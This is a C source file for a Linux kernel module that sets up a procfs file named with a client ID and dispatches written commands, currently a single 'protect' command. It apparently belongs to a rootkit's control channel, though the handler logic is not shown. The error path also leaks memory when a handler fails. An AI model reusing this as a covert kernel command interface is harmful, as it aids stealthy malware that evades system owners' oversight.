#include "inc/cmds.h"
#include "inc/util.h"

#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>

struct cmd {
  uint8_t        code;
  cmd_handler_t *handler;
};

struct cmd cmds[] = {
    {.code = 'P', .handler = cmd_protect},
};

#define CMD_SIZE_MAX (PATH_MAX + 10)
#define cmd_count()  (sizeof(cmds) / sizeof(cmds[0]))

loff_t __cmds_lseek(struct file *file, loff_t off, int whence) {
  return 0;
}

ssize_t __cmds_write(struct file *file, const char __user *buf, size_t buflen, loff_t *off) {
  char   *cmd = NULL;
  ssize_t ret = 0;
  uint8_t i   = 0;

  if (buflen > CMD_SIZE_MAX || buflen < 2) {
    ret = -EINVAL;
    goto end;
  }

  if ((cmd = kmalloc(buflen + 1, GFP_KERNEL)) == NULL) {
    debg("failed to allocate space for the command buffer");
    ret = -EFAULT;
    goto end;
  }

  memset(cmd, 0, buflen + 1);

  if (copy_from_user(cmd, buf, buflen)) {
    debg("fialed to copy the command from the userspace");
    ret = -EFAULT;
    goto end;
  }

  for (; i < cmd_count(); i++) {
    if (cmds[i].code != cmd[0])
      continue;

    debgf("calling the handler for command %c", cmd[0]);

    if (!cmds[i].handler(cmd + 1, buflen - 1))
      return -EFAULT;
  }

  ret = buflen;

end:
  if (NULL != cmd)
    kfree(cmd);
  return ret;
}

struct proc_dir_entry       *cmds_file = NULL;
static const struct proc_ops cmds_fops = {
    .proc_write = __cmds_write,
    .proc_lseek = __cmds_lseek,
};

bool cmds_install(void) {
  if ((cmds_file = proc_create("shrk_" SHRK_CLIENT_ID, 0644, NULL, &cmds_fops)) == NULL) {
    debg("failed to create the command procfs file");
    return false;
  }

  return true;
}

void cmds_uninstall(void) {
  if (NULL != cmds_file)
    proc_remove(cmds_file);
}
